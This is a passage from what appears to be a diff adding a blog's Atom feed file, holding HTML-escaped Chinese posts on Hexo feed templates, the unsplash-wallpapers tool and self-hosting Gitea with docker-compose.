class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;rss&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;ATOM: &lt;code&gt;themes/layout/template/atom.ejs&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs html&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;feed&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;xmlns&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://www.w3.org/2005/Atom&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;id&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= config.url %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;id&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= config.title %&amp;gt;&amp;lt;%= tag ? ` • Posts by &amp;quot;$&amp;#123;tag&amp;#125;&amp;quot; tag` : &amp;#x27;&amp;#x27; %&amp;gt;&amp;lt;%= category ? ` • Posts by &amp;quot;$&amp;#123;category&amp;#125;&amp;quot; category` : &amp;#x27;&amp;#x27; %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;%= config.url %&amp;gt;&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;updated&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= moment(lastBuildDate).toISOString() %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;updated&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;    &amp;lt;%_ for (const &amp;#123; name &amp;#125; of (tags || [])) &amp;#123; _%&amp;gt;&lt;br&gt;    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;category&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;term&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;%= name %&amp;gt;&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br&gt;    &amp;lt;%_ &amp;#125; _%&amp;gt;&lt;br&gt;    &amp;lt;%_ for (const post of posts) &amp;#123; _%&amp;gt;&lt;br&gt;    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;entry&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;id&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= post.permalink %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;id&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= post.title %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;rel&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;alternate&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;%= post.permalink %&amp;gt;&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;content&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;html&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= post.content %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;content&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;        &amp;lt;%_ for (const &amp;#123; name &amp;#125; of (post.tags ? post.tags.toArray() : [])) &amp;#123; _%&amp;gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;category&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;term&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;%= name %&amp;gt;&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br&gt;        &amp;lt;%_ &amp;#125; _%&amp;gt;&lt;br&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;updated&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;lt;%= moment(post.date).toISOString() %&amp;gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;updated&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;entry&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;    &amp;lt;%_ &amp;#125; _%&amp;gt;&lt;br&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;feed&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;Json Feed: &lt;code&gt;themes/layout/template/json.ejs&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs html&#34;&gt;&amp;lt;%- JSON.stringify(&amp;#123;&lt;br&gt;  version: &amp;#x27;https://jsonfeed.org/version/1&amp;#x27;,&lt;br&gt;  title: config.title + (tag ? ` • All posts by &amp;quot;$&amp;#123;tag&amp;#125;&amp;quot; tag` : &amp;#x27;&amp;#x27;) + (category ? ` • All posts by &amp;quot;$&amp;#123;category&amp;#125;&amp;quot; category` : &amp;#x27;&amp;#x27;),&lt;br&gt;  description: config.description,&lt;br&gt;  home_page_url: config.url,&lt;br&gt;  items: posts.map(post =&amp;gt; (&amp;#123;&lt;br&gt;      id: post.permalink,&lt;br&gt;      url: post.permalink,&lt;br&gt;      title: post.title,&lt;br&gt;      date_published: moment(post.date).toISOString(),&lt;br&gt;      content_html: post.content || &amp;#x27;&amp;#x27;,&lt;br&gt;      tags:  (post.tags ? post.tags.toArray() : []).map((&amp;#123; name &amp;#125;) =&amp;gt; name)&lt;br&gt;  &amp;#125;))&lt;br&gt;&amp;#125;, null, 4) _%&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;設定&#34;&gt;&lt;a href=&#34;#設定&#34; class=&#34;headerlink&#34; title=&#34;設定&#34;&gt;&lt;/a&gt;設定&lt;/h2&gt;&lt;p&gt;修改 Heox 設定檔 &lt;code&gt;_config.yml&lt;/code&gt;  新增 feed 設定&lt;/p&gt;
+&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;feed:&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;limit:&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;order_by:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;-date&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;tag_dir:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;tag&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;category_dir:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;category&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;rss:&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-attr&#34;&gt;enable:&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-attr&#34;&gt;template:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;themes/layout/template/rss.ejs&amp;quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-attr&#34;&gt;output:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;rss.xml&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;atom:&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-attr&#34;&gt;enable:&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-attr&#34;&gt;template:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;themes/layout/template/atom.ejs&amp;quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-attr&#34;&gt;output:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;atom.xml&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;jsonFeed:&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-attr&#34;&gt;enable:&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-attr&#34;&gt;template:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;themes/layout/template/json.ejs&amp;quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-attr&#34;&gt;output:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;feed.json&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;詳細設定參考 &lt;a href=&#34;https://github.com/sergeyzwezdin/hexo-feed&#34;&gt;&lt;i class=&#34;nexmoefont icon-github&#34;&gt;&lt;/i&gt; GitHub&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;完成&#34;&gt;&lt;a href=&#34;#完成&#34; class=&#34;headerlink&#34; title=&#34;完成&#34;&gt;&lt;/a&gt;完成&lt;/h2&gt;&lt;p&gt;接下來只要重新佈署 hexo 即可&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;hexo server&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;檢查這些網址看是否安裝成功&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://localhost:4000/rss.xml&#34;&gt;http://localhost:4000/rss.xml&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://localhost:4000/atom.xml&#34;&gt;http://localhost:4000/atom.xml&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://localhost:4000/feed.json&#34;&gt;http://localhost:4000/feed.json&lt;/a&gt;&lt;/p&gt;
+</content>
+        <category term="Blog" />
+        <category term="Hexo" />
+        <updated>2021-12-09T05:48:27.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2021/12/06/unsplash-wallpapers/</id>
+        <title>自動換桌布 unsplash-wallpapers</title>
+        <link rel="alternate" href="https://zonego.tw/2021/12/06/unsplash-wallpapers/"/>
+        <content type="html">&lt;p&gt;自動換桌布的方案有很多&lt;/p&gt;
+&lt;p&gt;在 Windows 上比較有名的是 Wallpaper Engine，除了一般的圖片之外，還可以將影片、靜態網頁做成桌布&lt;/p&gt;
+&lt;p&gt;跨平台的方案則有微軟的 bing wallpaper&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+
+&lt;link rel=&#34;stylesheet&#34; href=&#34;/image.css&#34;&gt;
+
+&lt;h2 id=&#34;Unsplash&#34;&gt;&lt;a href=&#34;#Unsplash&#34; class=&#34;headerlink&#34; title=&#34;Unsplash&#34;&gt;&lt;/a&gt;Unsplash&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://unsplash.com/&#34;&gt;Unsplash&lt;/a&gt; 是一個免費的相片共享網站&lt;br&gt;攝影師可以將相片上傳到 Unsplash，相片編輯者們會對使用者上傳的相片進行整理&lt;br&gt;Unsplash 使用了較為自由的著作權許可條款，這讓 Unsplash 上的相片經常在文章配圖中出現&lt;/p&gt;
+&lt;p&gt;想當然，官方也推出像 bing wallpaper 一樣的自動桌布工具&lt;a href=&#34;https://unsplash.com/apps&#34;&gt;在這裡&lt;/a&gt;&lt;br&gt;但只有 iOS MAC AppleTV 以及 chrome 能使用&lt;/p&gt;
+&lt;p&gt;但PC平台才是大神開發者的發源地，這種小問題已經有人解決了&lt;/p&gt;
+&lt;h2 id=&#34;unsplash-wallpapers&#34;&gt;&lt;a href=&#34;#unsplash-wallpapers&#34; class=&#34;headerlink&#34; title=&#34;unsplash-wallpapers&#34;&gt;&lt;/a&gt;unsplash-wallpapers&lt;/h2&gt;&lt;p&gt;這次要介紹的就是基於&lt;a href=&#34;https://unsplash.com/&#34;&gt;Unsplash&lt;/a&gt;圖庫的開源小工具 unsplash-wallpapers&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/soroushchehresa/unsplash-wallpapers&#34;&gt;&lt;i class=&#34;nexmoefont icon-github&#34;&gt;&lt;/i&gt; Github&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;特點&#34;&gt;&lt;a href=&#34;#特點&#34; class=&#34;headerlink&#34; title=&#34;特點&#34;&gt;&lt;/a&gt;特點&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;支援 Windows MAC Linux 系統&lt;/li&gt;
+&lt;li&gt;紀錄更換過的歷史桌布.&lt;/li&gt;
+&lt;li&gt;可設定自動更換週期，每小時、每天、每周、手動&lt;/li&gt;
+&lt;li&gt;下載桌布原圖&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;範例&#34;&gt;&lt;a href=&#34;#範例&#34; class=&#34;headerlink&#34; title=&#34;範例&#34;&gt;&lt;/a&gt;範例&lt;/h3&gt;&lt;p&gt;&lt;div class=&#34;justified-gallery&#34;&gt;&lt;div&gt;&lt;img alt=&#34;MAC&#34; src=&#34;/images/content/unsplash-wallpapers-mac.gif&#34; data-src=&#34;/images/content/unsplash-wallpapers-mac.gif&#34; data-fancybox=&#34;gallery&#34;&gt;&lt;/div&gt;&lt;div&gt;&lt;img alt=&#34;Windows&#34; src=&#34;/images/content/unsplash-wallpapers-windows.gif&#34; data-src=&#34;/images/content/unsplash-wallpapers-windows.gif&#34; data-fancybox=&#34;gallery&#34;&gt;&lt;/div&gt;&lt;div&gt;&lt;img alt=&#34;Linux&#34; src=&#34;/images/content/unsplash-wallpapers-linux.gif&#34; data-src=&#34;/images/content/unsplash-wallpapers-linux.gif&#34; data-fancybox=&#34;gallery&#34;&gt;&lt;/div&gt;&lt;/p&gt;
+
+            &lt;/div&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;下載&#34;&gt;&lt;a href=&#34;#下載&#34; class=&#34;headerlink&#34; title=&#34;下載&#34;&gt;&lt;/a&gt;下載&lt;/h3&gt;&lt;p&gt;下載點請到 &lt;a href=&#34;https://github.com/soroushchehresa/unsplash-wallpapers/releases&#34;&gt;&lt;i class=&#34;nexmoefont icon-github&#34;&gt;&lt;/i&gt; Github Release&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;依據你的系統下載定應安裝檔&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/unsplash-wallpaper-release.jpg&#34; alt=&#34;release&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;MAC 系統下載 &lt;code&gt;.dmg&lt;/code&gt;&lt;br&gt;Windows 下載 &lt;code&gt;.exe&lt;/code&gt;&lt;br&gt;Redhat、Centos 下載 &lt;code&gt;.rpm&lt;/code&gt;&lt;br&gt;debain、Ubuntu 下載 &lt;code&gt;.deb&lt;/code&gt;&lt;br&gt;要自行編譯就下載 Sorce code&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;裝完就可以享受定時自動換桌布啦🎉&lt;/p&gt;
+</content>
+        <category term="Windows" />
+        <category term="Linux" />
+        <category term="Mac" />
+        <category term="桌布" />
+        <updated>2021-12-06T11:05:56.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2021/11/25/gitea/</id>
+        <title>Gitea - Git 自架伺服器首選</title>
+        <link rel="alternate" href="https://zonego.tw/2021/11/25/gitea/"/>
+        <content type="html">&lt;p&gt;作為寫過程式的人，Git是必備工具 &lt;del&gt;除非只是寫好玩的&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;常見的線上Git儲藏庫就是 &lt;a href=&#34;https://github.com/&#34;&gt;GitHub&lt;/a&gt;、&lt;a href=&#34;https://about.gitlab.com/&#34;&gt;Gitlab&lt;/a&gt;、&lt;a href=&#34;https://bitbucket.org/&#34;&gt;Bitbucket&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;對於這些公開平台不放心，或是程式碼不想外流，那就自己架私服吧!&lt;/p&gt;
+&lt;p&gt;常見的有 &lt;a href=&#34;https://gitea.io/&#34;&gt;Gitea&lt;/a&gt;、&lt;a href=&#34;https://gogs.io/&#34;&gt;gogs&lt;/a&gt;或是&lt;a href=&#34;https://about.gitlab.com/&#34;&gt;Gitlab&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Gitlab裡面包含 CI/CD 工具等功能，十分肥大&lt;/p&gt;
+&lt;p&gt;想要一個安裝簡單、功能近似GitHub又有中文介面，那就選 Gitea 吧！&lt;/p&gt;
+&lt;h1 id=&#34;安裝&#34;&gt;&lt;a href=&#34;#安裝&#34; class=&#34;headerlink&#34; title=&#34;安裝&#34;&gt;&lt;/a&gt;安裝&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://docs.gitea.io/&#34;&gt;說明文件&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Gitea 提供很多安裝方式，我這邊選則用 docker &lt;del&gt;手邊有現成的docker伺服器，不用白不用&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://docs.gitea.io/zh-tw/install-with-docker-rootless/&#34;&gt;docker-compose 安裝說明&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;選則版本&#34;&gt;&lt;a href=&#34;#選則版本&#34; class=&#34;headerlink&#34; title=&#34;選則版本&#34;&gt;&lt;/a&gt;選則版本&lt;/h2&gt;&lt;p&gt;Gitea 的官方映像可以在 &lt;a href=&#34;https://hub.docker.com/r/gitea/gitea/&#34;&gt;Docker Hub&lt;/a&gt; 找到&lt;/p&gt;
+&lt;p&gt;版本 tag 與 Gitea 的 &lt;a href=&#34;https://github.com/go-gitea/gitea&#34;&gt;&lt;i class=&#34;nexmoefont icon-github&#34;&gt;&lt;/i&gt; Github&lt;/a&gt; 上發布的版本號一樣&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;latest&lt;/code&gt; 則是最新的穩定版&lt;/p&gt;
+&lt;h2 id=&#34;選擇資料庫&#34;&gt;&lt;a href=&#34;#選擇資料庫&#34; class=&#34;headerlink&#34; title=&#34;選擇資料庫&#34;&gt;&lt;/a&gt;選擇資料庫&lt;/h2&gt;&lt;p&gt;Gitea 支援多種資料庫，例如 &lt;code&gt;mysql&lt;/code&gt; &lt;code&gt;mariadb&lt;/code&gt; &lt;code&gt;PostgreSQL&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;安裝過程&#34;&gt;&lt;a href=&#34;#安裝過程&#34; class=&#34;headerlink&#34; title=&#34;安裝過程&#34;&gt;&lt;/a&gt;安裝過程&lt;/h2&gt;&lt;p&gt;使用 docker-compose 安裝&lt;/p&gt;
+&lt;p&gt;我這邊選用 mysql 資料庫&lt;/p&gt;
+&lt;p&gt;docker-compose.yml&lt;/p&gt;
+&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;version:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;services:&lt;/span&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;server:&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;image:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;gitea/gitea:1.15.6-rootless&lt;/span&gt;&lt;br&gt;     &lt;span class=&#34;hljs-attr&#34;&gt;environment:&lt;/span&gt;&lt;br&gt;       &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;GITEA__database__DB_TYPE=mysql&lt;/span&gt;&lt;br&gt;       &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;GITEA__database__HOST=db:3306&lt;/span&gt;&lt;br&gt;       &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;GITEA__database__NAME=gitea&lt;/span&gt;&lt;br&gt;       &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;GITEA__database__USER=gitea&lt;/span&gt;&lt;br&gt;       &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;GITEA__database__PASSWD=gitea&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;restart:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;always&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;volumes:&lt;/span&gt;&lt;br&gt;      &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;./data:/var/lib/gitea&lt;/span&gt;&lt;br&gt;      &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;./config:/etc/gitea&lt;/span&gt;  &lt;br&gt;      &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;/etc/timezone:/etc/timezone:ro&lt;/span&gt;&lt;br&gt;      &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;/etc/localtime:/etc/localtime:ro&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;ports:&lt;/span&gt;&lt;br&gt;      &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;10080:3000&amp;quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;10022:22&amp;quot;&lt;/span&gt;&lt;br&gt;     &lt;span class=&#34;hljs-attr&#34;&gt;depends_on:&lt;/span&gt;&lt;br&gt;       &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;db&lt;/span&gt;&lt;br&gt; &lt;br&gt;   &lt;span class=&#34;hljs-attr&#34;&gt;db:&lt;/span&gt;&lt;br&gt;     &lt;span class=&#34;hljs-attr&#34;&gt;image:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;mysql:8&lt;/span&gt;&lt;br&gt;     &lt;span class=&#34;hljs-attr&#34;&gt;restart:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;always&lt;/span&gt;&lt;br&gt;     &lt;span class=&#34;hljs-attr&#34;&gt;environment:&lt;/span&gt;&lt;br&gt;       &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;MYSQL_ROOT_PASSWORD=gitea&lt;/span&gt;&lt;br&gt;       &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;MYSQL_USER=gitea&lt;/span&gt;&lt;br&gt;       &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;MYSQL_PASSWORD=gitea&lt;/span&gt;&lt;br&gt;       &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;MYSQL_DATABASE=gitea&lt;/span&gt;&lt;br&gt;     &lt;span class=&#34;hljs-attr&#34;&gt;volumes:&lt;/span&gt;&lt;br&gt;       &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;./mysql:/var/lib/mysql&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;執行&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose up&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;完成後可以用 &lt;a href=&#34;http://hostname:10080/&#34;&gt;http://hostname:10080&lt;/a&gt; 連到你剛剛架的 gitea&lt;/p&gt;
+&lt;p&gt;SSH 要使用 10022 例如 &lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; ssh://git@hostname:10022/username/repo.git&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;如果想用預設 Port &lt;/p&gt;
